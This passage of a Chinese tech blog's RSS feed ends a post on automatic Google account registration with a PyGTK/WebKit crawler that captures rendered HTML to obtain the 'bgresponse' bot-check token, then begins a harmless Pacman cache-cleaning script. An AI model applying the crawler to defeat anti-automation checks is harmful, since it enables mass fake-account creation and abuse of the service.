        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute_script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;oldtitle=document.title;document.title=document.documentElement.innerHTML;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_main_frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute_script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;document.title=oldtitle;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Crawler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gtk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;gtk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gdk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;threads_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# suggested by Nicholas Herriot for Ubuntu Koala&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;gtk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Window&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;crawl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WebView&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;load-finished&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_finished_loading&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;gtk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_finished_loading&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;frame&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;gtk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main_quit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_cmd_options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;crawler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Crawler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;crawler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crawl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_cmd_options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;sd&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;        gets and validates the input from the command line&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;usage: %prog [options] args&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OptionParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;-u&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;--url&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;URL to fetch data from&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;-f&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;--file&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Local file path to save data to&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;You must specify an URL.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;--help for more details&amp;#39;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;You must specify a destination file.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;--help for more details&amp;#39;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这样就可以得到&lt;code&gt;bgresponse&lt;/code&gt;的值了。&lt;/p&gt;
</description>
                <link>http://www.zzsec.org/2013/04/google-account-automatic-registration</link>
                <guid>http://www.zzsec.org/2013/04/google-account-automatic-registration</guid>
                <pubDate>2013-04-05T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>Pacman缓存清理</title>
                <description>&lt;h3&gt;前言&lt;/h3&gt;

&lt;p&gt;有一段时间没有清理pacman的缓存了，今天&lt;code&gt;du -hs&lt;/code&gt;了一下子发现缓存居然有5G之多，所以决定写一个小程序来清理多余的包，每个包只保留当前的最新版本。其实很早之前就想写这么一个小程序了，今天才动手花了半个小时把它实现了。&lt;/p&gt;

&lt;h3&gt;程序&lt;/h3&gt;

&lt;p&gt;代码是用python写的，把程序放在缓存目录，运行即可。&lt;/p&gt;

&lt;!--more--&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#! /usr/bin/env python&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;realpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__file__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pkgs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pkgs_ext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pkg_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_pkg_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_p_name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkg_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;_pkg_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_pkg_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_p_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_pkg_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_pkg_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_pkg_name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pkgs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pkgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_pkg_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pkgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_pkg_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;pkgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_pkg_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pkgs_ext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_pkg_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;del_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pkgs_maxver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
